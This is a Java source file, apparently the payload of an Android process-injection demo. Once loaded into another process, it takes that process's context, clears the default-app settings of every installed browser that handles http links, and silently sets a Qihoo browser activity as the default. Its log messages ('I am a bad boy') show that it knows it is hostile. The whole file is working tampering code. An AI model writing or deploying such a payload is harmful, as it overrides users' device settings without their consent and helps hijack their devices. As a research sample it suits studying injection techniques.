package com.demo.inject2;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.util.Log;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.List;


/**
 * @author boyliang
 */
public final class EntryClass {
    public static final String TAG = "INJECT";

    public static Object[] invoke(int i) {

        try {
            Log.i(TAG, ">>>>>>>>>>>>>I am in, I am a bad boy 2!!!!<<<<<<<<<<<<<<");
            Context context = ContexHunter.getContext();
            PackageManager pm = context.getPackageManager();
            String str1 = "android.intent.category.DEFAULT";
            String str2 = "android.intent.category.BROWSABLE";
            String str3 = "android.intent.action.VIEW";
            IntentFilter filter = new IntentFilter(str3);
            filter.addCategory(str1);
            filter.addCategory(str2);
            filter.addDataScheme("http");

            Intent intent = new Intent(str3);
            intent.addCategory(str2);
            intent.addCategory(str1);
            Uri uri = Uri.parse("http://");
            intent.setDataAndType(uri, null);


            List<ResolveInfo> resolveInfoList = pm.queryIntentActivities(intent,
                    PackageManager.GET_INTENT_FILTERS);
            int size = resolveInfoList.size();
            ComponentName defcomponent = null;
            ComponentName[] arrayOfComponentName = new ComponentName[size];
            for (int k = 0; k < size; k++) {
                ActivityInfo activityInfo = resolveInfoList.get(k).activityInfo;
                    if (activityInfo.name.equals("com.qihoo.browser.activity.SplashActivity")
                            || activityInfo.name.equals("com.qihoo.browser.BrowserActivity")) {
                    defcomponent = new ComponentName(activityInfo.packageName, activityInfo.name);
                }
                pm.clearPackagePreferredActivities(activityInfo.packageName);
                ComponentName componentName = new ComponentName(activityInfo.packageName, activityInfo.name);
                arrayOfComponentName[k] = componentName;
                Log.i(TAG, "name:" + activityInfo.name);
            }
            if (defcomponent != null) {
                pm.addPreferredActivity(filter,
                        IntentFilter.MATCH_CATEGORY_SCHEME, arrayOfComponentName,
                        defcomponent);
                Log.i(TAG, ">>>>>>>>>>>>>set default<<<<<<<<<<<<<<");
            }
            Log.i(TAG, ">>>>>>>>>>>>>end<<<<<<<<<<<<<<");
        } catch (Exception e) {
            StringWriter errors = new StringWriter();
            e.printStackTrace(new PrintWriter(errors));
            Log.i(TAG, errors.toString());
        }

        return null;
    }
}
